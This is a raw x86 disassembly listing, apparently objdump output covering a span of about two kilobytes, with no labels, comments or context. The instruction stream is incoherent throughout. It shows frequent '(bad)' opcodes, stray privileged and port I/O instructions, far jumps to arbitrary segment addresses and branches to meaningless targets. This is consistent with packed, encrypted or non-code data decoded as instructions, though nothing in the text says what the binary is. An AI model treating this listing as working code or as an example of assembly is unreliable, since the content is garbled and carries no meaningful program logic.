  4161f9:	pop    ebx
  4161fa:	ret    
  4161fb:	mov    esi,0x114c916d
  416200:	xor    ebx,edx
  416202:	dec    ecx
  416203:	leave  
  416204:	call   FWORD PTR cs:[ebp+0x2d]
  416208:	push   esi
  416209:	sub    eax,DWORD PTR [ebp+0x4746fd69]
  41620f:	jmp    0x3aefa2c5
  416214:	lahf   
  416215:	push   0xa410a12b
  41621a:	xor    ah,BYTE PTR [esi+eiz*2]
  41621d:	in     al,dx
  41621e:	aad    0xa5
  416220:	sub    al,0x63
  416223:	mov    bl,0xc6
  416225:	add    al,0x39
  416227:	sbb    ah,bl
  416229:	push   ss
  41622a:	push   ebx
  41622b:	pop    ss
  41622c:	jecxz  0x41628b
  41622e:	xor    al,0x7
  416230:	rcr    BYTE PTR [edx+0x71289cd6],0x53
  416237:	jno    0x41629f
  416239:	adc    al,0xd
  41623b:	test   dh,ah
  41623d:	aam    0xe7
  41623f:	bound  esi,QWORD PTR [ebp+ebx*4+0x2cf076e5]
  416246:	cmp    eax,0x95158512
  41624b:	and    al,0x81
  41624d:	push   cs
  41624e:	fadd   QWORD PTR [edx+eax*1]
  416251:	mov    BYTE PTR [esi],dh
  416253:	and    BYTE PTR [ecx],ch
  416255:	xor    esp,esp
  416257:	adc    al,0xd1
  416259:	adc    ah,BYTE PTR [ebx-0x61512768]
  41625f:	push   edx
  416260:	leave  
  416261:	xchg   esi,eax
  416262:	mov    ah,0x88
  416264:	jne    0x4161ed
  416266:	inc    esi
  416267:	(bad)  
  416269:	gs push cs
  41626b:	std    
  41626c:	mov    dl,0x30
  41626e:	adc    ah,BYTE PTR [ecx-0x1830c3bc]
  416274:	addr16 (bad) 
  416276:	mov    BYTE PTR [edx-0x35c9ce2b],cl
  41627c:	shl    BYTE PTR [ecx+0x5d],cl
  41627f:	cmp    cl,BYTE PTR [ebx]
  416281:	add    DWORD PTR [edi],0xbcb49701
  416287:	mov    dh,0x4c
  416289:	adc    eax,0x6c7a2e35
  41628e:	cs clc 
  416290:	hlt    
  416291:	sbb    BYTE PTR [edx],dh
  416293:	ins    BYTE PTR es:[edi],dx
  416294:	mov    cl,0xc0
  416296:	punpcklbw mm5,mm5
  416299:	push   ecx
  41629a:	sub    DWORD PTR [ebp+0x6cb2c451],ecx
  4162a0:	push   ebx
  4162a1:	push   edi
  4162a2:	mov    ah,0xf5
  4162a4:	cmp    BYTE PTR [eax-0x2d],ch
  4162a7:	jmp    0xe7c9:0xae2b33b2
  4162ae:	or     eax,0xd64f14cb
  4162b3:	fwait
  4162b4:	enter  0xd413,0x7e
  4162b8:	mov    al,ds:0xc5912d84
  4162bd:	xchg   ebx,eax
  4162be:	rol    DWORD PTR [edi+0x496a9ce4],cl
  4162c4:	xor    DWORD PTR [ecx-0x51f4fd0b],0x17a0ee6f
  4162ce:	scas   al,BYTE PTR es:[edi]
  4162cf:	ror    BYTE PTR [edi],1
  4162d1:	rol    DWORD PTR [edx],1
  4162d3:	cmp    eax,ebp
  4162d5:	ret    
  4162d6:	imul   ecx,DWORD PTR [eax-0x45],0xffffffad
  4162da:	call   0x3659397
  4162df:	dec    esi
  4162e0:	push   ecx
  4162e1:	xor    DWORD PTR [edx+eax*2-0x23],0xffffffa1
  4162e6:	or     al,0x75
  4162e9:	pop    ebp
  4162ea:	adc    ebp,DWORD PTR [eax+0x7e54e2c1]
  4162f0:	inc    ecx
  4162f1:	dec    edx
  4162f2:	neg    BYTE PTR [ecx]
  4162f4:	pop    esi
  4162f5:	setle  BYTE PTR [ebp-0x18c48333]
  4162fc:	cmc    
  4162fd:	mov    ebx,ebx
  4162ff:	jbe    0x4162f9
  416301:	mov    ebx,0x2de2dcc4
  416306:	mov    eax,0xbc7c1f90
  41630b:	enter  0x2f60,0x6c
  41630f:	retf   0xa9c1
  416312:	shl    ebp,0xc2
  416315:	xor    al,0x64
  416317:	mov    esp,0x51a21c66
  41631c:	or     ah,cl
  41631e:	xor    bl,BYTE PTR [ecx+0x73673c12]
  416324:	(bad)  
  416325:	fcomp  QWORD PTR [eax+0x65]
  416328:	xor    edi,edx
  41632a:	add    ebx,DWORD PTR [ebx-0x5f]
  41632d:	and    DWORD PTR [ebx+ecx*8-0x7d],ebx
  416331:	push   esi
  416332:	out    0x9c,al
  416334:	sbb    DWORD PTR [ebx],edx
  416336:	mov    al,ds:0xfee49200
  41633b:	mov    DWORD PTR [ebp+edi*8-0x60],ebx
  41633f:	stos   BYTE PTR es:[edi],al
  416340:	rol    BYTE PTR [edx],cl
  416342:	lock mov bl,BYTE PTR ds:0x42e4bad0
  416349:	test   eax,0x2b32fe55
  41634e:	jb     0x4162f8
  416350:	mov    edi,0x733a24af
  416355:	int    0xd6
  416357:	dec    eax
  416358:	push   ecx
  416359:	and    DWORD PTR [ecx+ecx*2+0x49d7da99],ebx
  416360:	enter  0x84bb,0x7f
  416364:	and    al,0xbf
  416366:	and    BYTE PTR [ecx+0x4a],ch
  416369:	mov    eax,0xe777b7af
  41636e:	not    edx
  416370:	(bad)
  416373:	(bad)  
  416374:	test   al,0x41
  416376:	jmp    0x26231042
  41637b:	sbb    DWORD PTR [ebx-0x66],esp
  41637e:	cmp    ah,BYTE PTR [esi+0x40]
  416381:	push   ss
  416382:	aad    0x88
  416384:	or     ch,BYTE PTR [ebx+ebp*4]
  416387:	mov    edx,DWORD PTR [ecx+0x2c]
  41638a:	(bad)  
  41638b:	lods   al,BYTE PTR ds:[esi]
  41638c:	rcl    BYTE PTR [ecx-0x5140f1d],1
  416392:	js     0x4163fc
  416394:	jmp    0x416376
  416396:	rcr    BYTE PTR [eax],0x2a
  416399:	inc    esi
  41639a:	sbb    edi,DWORD PTR [edx+0x5]
  41639d:	(bad)  
  41639f:	leave  
  4163a0:	aaa    
  4163a1:	das    
  4163a2:	sub    ah,ah
  4163a4:	fwait
  4163a5:	push   eax
  4163a6:	mov    edi,DWORD PTR [ecx+0x77999aeb]
  4163ac:	test   eax,0x1f953fcb
  4163b1:	add    eax,0x63303c46
  4163b6:	(bad)  
  4163b7:	fbld   TBYTE PTR [edx]
  4163b9:	(bad)  
  4163ba:	push   eax
  4163bb:	sbb    BYTE PTR [esi+0x452a3f63],ch
  4163c1:	add    BYTE PTR [ecx],cl
  4163c3:	aaa    
  4163c4:	mov    ebp,0x9ca34e8a
  4163c9:	popf   
  4163ca:	popa   
  4163cb:	mov    bl,0x39
  4163cd:	stc    
  4163ce:	daa    
  4163cf:	inc    esp
  4163d0:	jnp    0x41636b
  4163d2:	push   esi
  4163d3:	sub    dh,BYTE PTR [esi-0x17a5a96d]
  4163d9:	imul   esp,DWORD PTR [edx-0x581233a7],0xb4a2f52
  4163e3:	push   es
  4163e4:	mov    ah,0x2f
  4163e6:	push   0x148a569
  4163eb:	mov    WORD PTR [edi+edx*8],fs
  4163ee:	xor    esi,DWORD PTR [eax+0x13]
  4163f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163f2:	mov    ch,bh
  4163f4:	push   0xffffff9f
  4163f6:	lds    edi,FWORD PTR [eax+0x74]
  4163f9:	and    al,0x9d
  4163fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163fc:	clc    
  4163fd:	(bad)  
  4163fe:	retf   0xdc84
  416401:	ja     0x4163d4
  416403:	push   ebp
  416404:	adc    cl,BYTE PTR ds:0x6c7ce19d
  41640a:	mov    ah,0xe0
  41640c:	imul   ebp,DWORD PTR [ecx],0xda1a3ea2
  416412:	out    dx,al
  416413:	popa   
  416414:	iret   
  416415:	xchg   ecx,eax
  416416:	fst    QWORD PTR [ebx-0x62d72aab]
  41641c:	lock hlt 
  41641e:	pop    ebx
  41641f:	stos   DWORD PTR es:[edi],eax
  416420:	daa    
  416421:	ss push es
  416423:	push   ds
  416424:	ret    0x21a2
  416427:	mov    esp,0x5d133216
  41642c:	mov    al,0x32
  41642e:	xor    BYTE PTR [ebx+0x56],bl
  416431:	push   ebx
  416432:	and    al,BYTE PTR [eax]
  416434:	nop
  416435:	sar    eax,1
  416437:	xor    eax,0xa56af948
  41643c:	xor    al,0xef
  41643e:	call   0x9c8f:0x44872169
  416445:	inc    edi
  416446:	jp     0x41645c
  416448:	xchg   esi,eax
  416449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41644a:	(bad)  
  41644b:	adc    eax,esi
  41644d:	dec    ecx
  41644e:	mov    bh,0x6d
  416450:	popf   
  416451:	push   ecx
  416452:	stos   DWORD PTR es:[edi],eax
  416453:	inc    eax
  416454:	(bad)  
  416455:	in     al,dx
  416456:	retf   
  416457:	xchg   esp,eax
  416458:	mov    dl,BYTE PTR [ebp-0x501627cd]
  41645e:	push   ebx
  41645f:	rcl    DWORD PTR [edx+0x6a0bf229],1
  416465:	arpl   dx,bp
  416467:	push   ecx
  416468:	sub    ebx,DWORD PTR [edx]
  41646a:	daa    
  41646b:	add    al,bl
  41646d:	ja     0x41645a
  41646f:	jmp    FWORD PTR [ecx-0x6f10c062]
  416475:	inc    eax
  416476:	mov    edi,0x598e0d1f
  41647b:	test   eax,0x6b72df42
  416480:	in     eax,dx
  416481:	inc    ebx
  416482:	bound  edx,QWORD PTR [eax+0x530c6323]
  416488:	cs inc esi
  41648a:	mov    cl,0x60
  41648c:	sti    
  41648d:	in     al,0x7a
  41648f:	ror    DWORD PTR [edi],0xa4
  416492:	cmp    al,0x1c
  416494:	cmp    al,0xb0
  416496:	leave  
  416497:	ds sbb cl,bh
  41649a:	in     eax,0x39
  41649c:	jmp    0x3e58:0x3d82ab7e
  4164a3:	xchg   edi,eax
  4164a4:	std    
  4164a5:	xor    DWORD PTR [esi-0xd],0xb6c21534
  4164ac:	and    DWORD PTR [ecx+0x79],esi
  4164af:	lock fidiv DWORD PTR [esp+ebx*4-0x38a70c84]
  4164b7:	test   BYTE PTR [ecx-0x6c],bl
  4164ba:	dec    esp
  4164bb:	in     eax,dx
  4164bc:	xor    DWORD PTR [ecx+0x50],0xffffff9c
  4164c0:	xchg   edi,eax
  4164c1:	pop    edi
  4164c2:	loope  0x416530
  4164c4:	inc    edi
  4164c5:	pop    ebx
  4164c6:	xor    edx,DWORD PTR [ebp+0x1de8559b]
  4164cc:	(bad)
  4164d0:	dec    edx
  4164d1:	mov    ch,bl
  4164d3:	test   eax,0x58c68c0a
  4164d8:	stos   BYTE PTR es:[edi],al
  4164d9:	jnp    0x41648d
  4164db:	fdivrp st(1),st
  4164dd:	sub    dl,BYTE PTR [edi+0x19]
  4164e0:	xor    al,0xfe
  4164e2:	fiadd  DWORD PTR [ecx]
  4164e4:	xor    al,0x26
  4164e6:	push   ebx
  4164e7:	pop    esi
  4164e8:	xchg   esi,eax
  4164e9:	(bad)
  4164ed:	xchg   ebx,eax
  4164ee:	sbb    edi,DWORD PTR [esi-0x4bc9e9e5]
  4164f4:	repz mov edx,0x4656d3f2
  4164fa:	xlat   BYTE PTR ds:[ebx]
  4164fb:	or     BYTE PTR [eax-0xe],bl
  4164fe:	push   ebx
  4164ff:	dec    edx
  416500:	les    ebp,FWORD PTR [ebx-0x7b]
  416503:	mov    bh,0xea
  416505:	jge    0x416576
  416507:	lods   al,BYTE PTR ds:[esi]
  416508:	mov    ch,0x12
  41650a:	mov    eax,ds:0x8e7d63b9
  41650f:	retf   
  416510:	fistp  WORD PTR [eax+0x5b]
  416513:	dec    ebx
  416514:	mov    dl,0x9
  416516:	sbb    WORD PTR [esi+ecx*1],bx
  41651a:	stc    
  41651b:	jo     0x416542
  41651d:	adc    al,BYTE PTR [ecx+0x48]
  416520:	xor    ebp,DWORD PTR [eax-0x6710fdc9]
  416526:	pop    es
  416527:	mov    edx,0x759e8661
  41652c:	out    dx,eax
  41652d:	push   edi
  41652e:	imul   ebp,DWORD PTR [edi],0xffffff8f
  416531:	pop    edx
  416532:	cmp    al,0x5e
  416534:	inc    edx
  416535:	sub    BYTE PTR [edi-0x4cd9f021],0x2b
  41653c:	std    
  41653d:	mov    edx,0x3f4f79e9
  416542:	jnp    0x4164ec
  416544:	pop    es
  416545:	cmc    
  416546:	or     DWORD PTR [edx-0x35],esp
  416549:	(bad)  
  41654a:	fxch   st(3)
  41654c:	cs dec esp
  41654e:	popa   
  41654f:	lea    eax,[ebx]
  416551:	out    0x86,al
  416553:	mov    ebx,0x33f1bae8
  416558:	inc    ebp
  416559:	test   al,0xbc
  41655b:	mov    ch,0xc4
  41655d:	cld    
  41655e:	add    ebp,DWORD PTR [esp+ebx*2+0x6]
  416562:	arpl   WORD PTR [edi+0x43409068],dx
  416568:	sysexit 
  41656a:	sti    
  41656b:	or     esp,DWORD PTR [edi+0x272cf20d]
  416571:	popa   
  416572:	cmc    
  416573:	fbstp  TBYTE PTR [edx-0x2d]
  416576:	sahf   
  416577:	ds (bad) 
  41657a:	cmp    edi,DWORD PTR [ebp-0x17eeeea6]
  416580:	cli    
  416581:	push   es
  416582:	dec    edi
  416583:	mov    ch,0xb3
  416585:	cmp    ah,dl
  416587:	mov    ecx,0x16f2d2de
  41658c:	shl    DWORD PTR [ebx],1
  41658e:	nop
  41658f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416590:	xor    eax,0xfa96e28d
  416595:	ins    BYTE PTR es:[edi],dx
  416596:	inc    esp
  416597:	jecxz  0x4165b7
  416599:	int    0xb1
  41659b:	fs jno 0x4165e5
  41659e:	cmp    al,0x55
  4165a0:	xchg   edx,eax
  4165a1:	cmp    al,0xa6
  4165a3:	mov    ebx,0xbf512425
  4165a8:	cmp    cl,BYTE PTR [esi]
  4165aa:	scas   al,BYTE PTR es:[edi]
  4165ab:	out    dx,al
  4165ac:	mov    ebp,0xcf43b49
  4165b1:	mov    bh,0x73
  4165b3:	add    dl,BYTE PTR [esi-0x6e]
  4165b6:	mov    al,ds:0xf0fa6174
  4165bb:	clc    
  4165bc:	push   0x8786d0cf
  4165c1:	(bad)  
  4165c2:	ins    BYTE PTR es:[edi],dx
  4165c3:	pop    esi
  4165c4:	dec    eax
  4165c5:	(bad)  
  4165c6:	or     DWORD PTR ds:0xc3bb4d0a,esi
  4165cc:	sub    DWORD PTR [edx*2-0x45dc74ed],eax
  4165d3:	lods   eax,DWORD PTR ds:[esi]
  4165d4:	push   DWORD PTR [ecx+0x7f]
  4165d7:	xor    eax,0x6d8ddbf4
  4165dc:	push   edx
  4165dd:	xor    edi,edx
  4165df:	cwde   
  4165e0:	dec    DWORD PTR [edi]
  4165e2:	in     eax,dx
  4165e3:	out    dx,eax
  4165e4:	inc    eax
  4165e5:	bound  edi,QWORD PTR [ebx+ebx*2+0x5adef6de]
  4165ec:	leave  
  4165ed:	dec    esp
  4165ee:	popa   
  4165ef:	(bad)  
  4165f1:	or     DWORD PTR [esi],edi
  4165f3:	sahf   
  4165f4:	fnstenv [eax]
  4165f6:	jbe    0x416652
  4165f8:	mov    ecx,esi
  4165fa:	pop    esi
  4165fb:	pop    ebx
  4165fc:	xchg   ebp,edx
  4165fe:	pop    ebp
  4165ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416600:	mov    esp,0x714f89d8
  416605:	(bad)  
  416606:	clc    
  416607:	cmp    eax,0x3d3c9e46
  41660c:	jb     0x4165cc
  41660e:	jecxz  0x4165c1
  416610:	sar    BYTE PTR [edx+0x33c6cad4],cl
  416616:	mov    DWORD PTR [esi-0x6a],esp
  416619:	pop    ss
  41661a:	popf   
  41661b:	mov    cl,dh
  41661d:	mov    dl,0x3e
  41661f:	fwait
  416620:	cmp    bl,BYTE PTR [edx]
  416622:	xchg   esi,eax
  416623:	sbb    DWORD PTR [edx-0x64c5a811],ecx
  416629:	dec    ebx
  41662a:	xlat   BYTE PTR ds:[ebx]
  41662b:	inc    ebx
  41662c:	shl    ebx,0xd0
  41662f:	into   
  416630:	push   eax
  416631:	jle    0x4165bb
  416633:	or     eax,0x4b3561b3
  416638:	dec    eax
  416639:	jmp    0x46a3:0xa2bd7dc9
  416640:	(bad)  
  416641:	es pop es
  416643:	iret   
  416644:	fdivr  DWORD PTR [ebp-0x5765fef8]
  41664a:	jle    0x41669b
  41664c:	jmp    0x77e50a40
  416651:	mov    al,ds:0xe6120759
  416656:	mov    dl,0xf3
  416658:	xchg   esi,eax
  416659:	cmp    ebx,DWORD PTR [ecx-0x692368f2]
  41665f:	mov    ds:0x5c284ff4,al
  416664:	leave  
  416665:	or     al,0x81
  416667:	push   ebp
  416668:	xchg   ebx,eax
  416669:	push   0xbd45915c
  41666e:	aas    
  41666f:	pop    es
  416670:	jle    0x4165fb
  416672:	inc    edx
  416673:	xchg   esi,eax
  416674:	stos   DWORD PTR es:[edi],eax
  416675:	cli    
  416676:	push   esp
  416677:	call   0xabd6a8ec
  41667c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41667d:	fisub  DWORD PTR [eax]
  41667f:	inc    ebp
  416680:	sbb    eax,0xbd102d82
  416685:	jp     0x4166e2
  416687:	jae    0x4166b5
  416689:	sbb    DWORD PTR [ebp+0x2d],edx
  41668c:	sar    BYTE PTR [edx+0xfeccc83],cl
  416692:	pop    esp
  416693:	outs   dx,BYTE PTR ds:[esi]
  416694:	push   0x53
  416696:	push   ds
  416697:	aaa    
  416698:	jecxz  0x41666f
  41669a:	jo     0x41662d
  41669c:	outs   dx,BYTE PTR ds:[esi]
  41669d:	in     al,0x5f
  41669f:	xor    eax,0x9c145e65
  4166a4:	jmp    0xcf9ecdaf
  4166a9:	and    ecx,ebx
  4166ab:	call   0xe340e1a2
  4166b0:	mov    esp,0xbf0ae1e6
  4166b5:	jmp    0xf6a8:0x9bbcdb42
  4166bc:	mov    edi,DWORD PTR [edx-0x33f7100c]
  4166c2:	or     ecx,esp
  4166c4:	call   0x6897b97e
  4166c9:	sub    al,0xc4
  4166cb:	sbb    eax,DWORD PTR [ebx+edi*4+0x32c7cf40]
  4166d2:	mov    bl,0x96
  4166d4:	jecxz  0x41668c
  4166d6:	sbb    DWORD PTR [ebx-0x3a],ebx
  4166d9:	inc    esp
  4166da:	(bad)  
  4166dc:	mov    dl,0xf5
  4166de:	ficomp DWORD PTR [edi+0x23620347]
  4166e4:	in     eax,0x8a
  4166e6:	int    0x1b
  4166e8:	shr    BYTE PTR [esi+0x67349296],cl
  4166ee:	jge    0x4166de
  4166f0:	sub    eax,0x3e1ec475
  4166f5:	inc    ecx
  4166f6:	repnz outs dx,DWORD PTR ds:[esi]
  4166f8:	ds push edi
  4166fa:	lods   al,BYTE PTR ds:[esi]
  4166fb:	stos   DWORD PTR es:[edi],eax
  4166fc:	add    eax,0x272a7f8f
  416701:	sahf   
  416702:	sub    eax,eax
  416704:	push   cs
  416705:	sbb    DWORD PTR [eax+0x7047e488],ebp
  41670b:	nop
  41670c:	sbb    BYTE PTR [esi],bh
  41670e:	add    dh,ch
  416710:	mul    BYTE PTR ds:0xc40bf384
  416716:	and    eax,0x45492a44
  41671b:	sub    eax,0x6641cbb3
  416720:	inc    esi
  416721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416722:	cmc    
  416723:	or     al,0x8a
  416725:	mov    ch,0x5f
  416727:	cmp    dh,al
  416729:	cld    
  41672a:	scas   eax,DWORD PTR es:[edi]
  41672b:	mov    DWORD PTR [ebx+ebp*4-0x76],edi
  41672f:	or     eax,0x418c9824
  416734:	mov    cl,bh
  416736:	idiv   ebx
  416738:	or     esp,DWORD PTR [esi]
  41673a:	lods   al,BYTE PTR ds:[esi]
  41673b:	call   0x90a762b0
  416740:	mov    dl,BYTE PTR [eax+0x69]
  416743:	xor    eax,0x6bc42511
  416748:	es jmp 0x3651e73a
  41674e:	add    cl,BYTE PTR [eax+ebp*8]
  416751:	jne    0x416757
  416753:	aad    0xde
  416755:	iret   
  416756:	loop   0x416752
  416758:	(bad)  
  416759:	xchg   ebp,eax
  41675a:	push   cs
  41675b:	jns    0x4167d5
  41675d:	sub    eax,0x7764e381
  416762:	or     cl,BYTE PTR [ebp-0x7f77cbeb]
  416768:	(bad)  
  416769:	lock inc esi
  41676b:	arpl   WORD PTR [ebp+0x4341d147],cx
  416771:	or     ah,BYTE PTR [ebp-0x48]
  416774:	xor    DWORD PTR [ecx-0x4f],esi
  416777:	dec    esp
  416778:	adc    DWORD PTR [ebx+0x18],ebp
  41677b:	mov    WORD PTR [ebx-0x44],ss
  41677e:	(bad)  
  41677f:	sub    eax,0xf04f173e
  416784:	hlt    
  416785:	mov    ds:0xb76a794f,al
  41678a:	xchg   eax,esi
  41678c:	pop    edi
  41678d:	and    bl,BYTE PTR [ebx-0x4b06a826]
  416793:	(bad)  
  416795:	std    
  416796:	mul    BYTE PTR [ecx+0x7dd94dd7]
  41679c:	out    dx,al
  41679d:	call   0x2f72:0xf4a11c26
  4167a4:	mul    DWORD PTR [ebp+eax*2-0x75]
  4167a8:	(bad)  
  4167a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167aa:	or     BYTE PTR [ebx+0x371c0f97],ah
  4167b0:	fst    DWORD PTR [ecx+0x60a30684]
  4167b6:	aaa    
  4167b7:	cmp    al,0xb1
  4167b9:	push   esi
  4167ba:	sub    eax,ecx
  4167bc:	(bad)  
  4167bd:	loope  0x4167bb
  4167bf:	xor    eax,ebx
  4167c1:	out    0x49,al
  4167c3:	inc    esi
  4167c4:	cld    
  4167c5:	mov    edi,0x1a2eb6bb
  4167ca:	push   ss
  4167cb:	shl    DWORD PTR [ebp-0x31],0x90
  4167cf:	sbb    eax,0x670ac391
  4167d4:	mov    ebx,0x5692b2eb
  4167d9:	repz pop ebx
  4167db:	test   BYTE PTR [edi-0x73cee0df],ah
  4167e1:	xor    eax,0xd71e399f
  4167e6:	and    edx,DWORD PTR [eax]
  4167e8:	jmp    0x3b6fee74
  4167ed:	sub    al,0xa3
  4167ef:	popa   
  4167f0:	pushf  
  4167f1:	mov    bl,0x45
  4167f3:	fisub  DWORD PTR [edi]
  4167f5:	shl    DWORD PTR [ebx-0x5d085d95],1
  4167fb:	xor    al,0x2
  4167fd:	mov    ch,0xb9
  4167ff:	push   ebp
  416800:	xor    BYTE PTR [eax+0x7f],0x26
  416804:	mov    ch,BYTE PTR [eax+esi*8-0x4b]
  416808:	in     eax,0x53
  41680a:	push   0xffffffdf
  41680c:	test   BYTE PTR [ecx],ch
  41680e:	leave  
  41680f:	cmp    edi,DWORD PTR [edx+0x35]
  416812:	pop    es
  416813:	mov    ds:0x1a554e06,eax
  416818:	inc    esp
  416819:	push   ds
  41681a:	(bad)  
  41681b:	imul   esi,DWORD PTR [esi+0x2bdc7c8f],0xa867327c
  416825:	mov    es,WORD PTR [edi-0x4f]
  416828:	adc    DWORD PTR [edx],0x76
  41682b:	in     eax,dx
  41682c:	aaa    
  41682d:	sbb    esp,DWORD PTR [edx-0x2edeaf6a]
  416833:	daa    
  416834:	mov    esp,0x694ac755
  416839:	mov    bl,0x92
  41683b:	xchg   ebp,eax
  41683c:	xchg   esi,eax
  41683d:	jp     0x41688a
  41683f:	mov    ds:0x87c139d0,eax
  416844:	xchg   edi,eax
  416845:	sbb    DWORD PTR [esp+esi*8+0x2c],esp
  416849:	mov    eax,0xfbae7b01
  41684e:	mov    esp,0x27bbcdf8
  416853:	adc    BYTE PTR [ecx+0xa],dh
  416856:	pop    ebp
  416857:	jo     0x416841
  416859:	fstp   QWORD PTR [edi]
  41685b:	cmp    DWORD PTR [ebp+0x59a785ac],ebx
  416861:	pop    esi
  416862:	dec    ebx
  416863:	add    eax,0xb45c8e37
  416868:	pop    es
  416869:	aad    0x2f
  41686b:	pop    edi
  41686c:	repz scas al,BYTE PTR es:[edi]
  41686e:	sub    al,0x10
  416870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416871:	pop    DWORD PTR [edx+0x5574638a]
  416877:	and    ah,0xc
  41687a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41687b:	test   al,0x6c
  41687d:	js     0x4168b9
  41687f:	imul   ecx,DWORD PTR [ecx-0x3a66d150],0xdd7e5430
  416889:	cmp    edx,edi
  41688b:	mov    edi,0x63b056f5
  416890:	add    ecx,DWORD PTR [ecx]
  416892:	les    ecx,FWORD PTR [eax-0x5c]
  416895:	push   ebp
  416896:	push   edi
  416897:	dec    esp
  416898:	inc    esi
  416899:	ds add ebx,ebx
  41689c:	mov    ch,0xe6
  41689e:	cmp    esp,DWORD PTR [ecx]
  4168a0:	dec    esi
  4168a1:	sbb    DWORD PTR [ebx+0x16],esp
  4168a4:	cmp    bh,BYTE PTR [esi+0x7f]
  4168a7:	(bad)  
  4168a8:	das    
  4168a9:	jg     0x4168bc
  4168ab:	mov    cl,0x2f
  4168ad:	mov    eax,0xbef765c6
  4168b2:	(bad)  
  4168b4:	call   0xa91d385b
  4168b9:	rcl    edi,1
  4168bb:	scas   eax,DWORD PTR es:[edi]
  4168bc:	(bad)  
  4168bd:	in     eax,0xfe
  4168bf:	jne    0x4168ea
  4168c1:	and    dl,ch
  4168c3:	int    0x85
  4168c5:	inc    edi
  4168c6:	lods   eax,DWORD PTR ds:[esi]
  4168c7:	mov    cl,BYTE PTR [edx]
  4168c9:	imul   eax,DWORD PTR [edx+0x51e15d5e],0xfbb89a6d
  4168d3:	mov    DWORD PTR [edi+0x5b],ecx
  4168d6:	mov    BYTE PTR [ebp-0x14705ed0],ch
  4168dc:	and    al,0x94
  4168de:	repnz xchg ebp,eax
  4168e0:	in     eax,dx
  4168e1:	int    0xc1
  4168e3:	or     BYTE PTR [eax],bh
  4168e5:	sbb    dl,BYTE PTR [ebp-0x11f62a83]
  4168eb:	addr16 test al,0xea
  4168ee:	jge    0x4168a5
  4168f0:	aam    0xec
  4168f2:	mov    al,0xad
  4168f4:	push   esp
  4168f5:	sbb    eax,0x5a410ba
  4168fa:	stos   DWORD PTR es:[edi],eax
  4168fb:	mov    ah,BYTE PTR [ebp-0x7ed4ce09]
  416901:	mov    eax,0x8cf7d87c
  416907:	push   es
  416908:	(bad)  
  416909:	repnz add BYTE PTR [ebp+0x1d],0xb7
  41690e:	mov    ecx,0x7c935f76
  416913:	scas   al,BYTE PTR es:[edi]
  416914:	adc    esp,DWORD PTR [edx]
  416916:	ss lahf 
  416918:	xchg   BYTE PTR [edx+0x22],al
  41691b:	sub    DWORD PTR [esi],ebx
  41691d:	cmc    
  41691e:	cwde   
  41691f:	in     eax,0x8e
  416921:	jp     0x416944
  416923:	mov    edx,0x8889b1db
  416928:	dec    edx
  416929:	(bad)  
  41692a:	mov    edi,0xa34164ba
  41692f:	and    DWORD PTR [ecx+0x40],ebx
  416932:	add    BYTE PTR [ebx+edi*4],0x4d
  416936:	loop   0x41698a
  416938:	mov    dh,0xc8
  41693a:	es stc 
  41693c:	mov    esp,0xd8ebbc7e
  416941:	sahf   
  416942:	dec    edi
  416943:	pop    ebp
  416944:	shl    BYTE PTR [eax+0x68],0x4b
  416948:	cmc    
  416949:	shl    DWORD PTR [esi-0x7edb4870],0xed
  416950:	mov    BYTE PTR [esi+esi*1+0x40],ch
  416954:	inc    edx
  416955:	cmp    eax,0xed1c976d
  41695a:	fsub   DWORD PTR [edi+0x1]
  41695d:	repz mov eax,ds:0xe9eb0d52
  416963:	cmp    DWORD PTR [eax],esi
  416965:	cli    
  416966:	sti    
  416967:	inc    esi
  416968:	iret   
  416969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41696a:	loope  0x4169e7
  41696c:	dec    ebp
  41696d:	push   ecx
  41696e:	mov    esp,0x3da8369d
  416973:	retf   
  416974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416975:	lods   eax,DWORD PTR ds:[esi]
  416976:	sbb    ecx,DWORD PTR [esi+ecx*8-0x3e]
  41697a:	ds dec ebx
  41697c:	or     BYTE PTR [eax],cl
  41697e:	dec    esi
  41697f:	scas   eax,DWORD PTR es:[edi]
  416980:	push   eax
  416981:	jl     0x41697f
  416983:	icebp  
  416984:	or     esp,eax
  416986:	icebp  
  416987:	test   BYTE PTR [ebx+0x7ad460db],bh
  41698d:	and    DWORD PTR [edi],ecx
  41698f:	dec    esp
  416990:	xor    ebp,DWORD PTR [esi]
  416992:	test   BYTE PTR [edx],0xd4
  416995:	lea    edx,[edi-0x44]
  416998:	jo     0x4169fb
  41699a:	stos   DWORD PTR es:[edi],eax
  41699b:	ror    BYTE PTR [ecx],1
  41699d:	adc    ecx,DWORD PTR [edx+0x45]
  4169a0:	mov    edx,0x5c144d03
  4169a5:	cmp    eax,0x3fadb6b5
  4169aa:	xchg   edx,eax
  4169ab:	pop    esi
  4169ac:	call   esp
  4169ae:	in     eax,dx
  4169af:	les    eax,FWORD PTR [esi+0x39]
  4169b2:	outs   dx,BYTE PTR ds:[esi]
  4169b3:	jno    0x416955
  4169b5:	mov    ch,0x9b
  4169b7:	ins    BYTE PTR es:[edi],dx
  4169b8:	call   0x66ba:0x58dd97a5
  4169bf:	pop    eax
  4169c0:	xchg   ebx,eax
  4169c1:	xchg   DWORD PTR [ebp+ecx*1+0x66f25fac],ebp
  4169c8:	mov    ds:0x7ddf1031,al
  4169cd:	je     0x4169c5
  4169cf:	hlt    
  4169d0:	lahf   
  4169d1:	rcl    BYTE PTR ds:0x45b15b6e,0xe4
  4169d8:	push   0x56cb5693
  4169dd:	xchg   esi,eax
  4169de:	sti    
  4169df:	sub    eax,0x5edacd6f
  4169e4:	test   DWORD PTR [ebp+0x48],edx
  4169e7:	xchg   ebx,eax
  4169e8:	mov    bl,0xad
  4169ea:	ret    0xc760
  4169ed:	mov    esi,DWORD PTR [esi]
  4169ef:	(bad)  
  4169f0:	retf   
  4169f1:	out    0x92,eax
  4169f3:	sbb    ecx,DWORD PTR [ebp+0x6552104d]
  4169f9:	cdq    
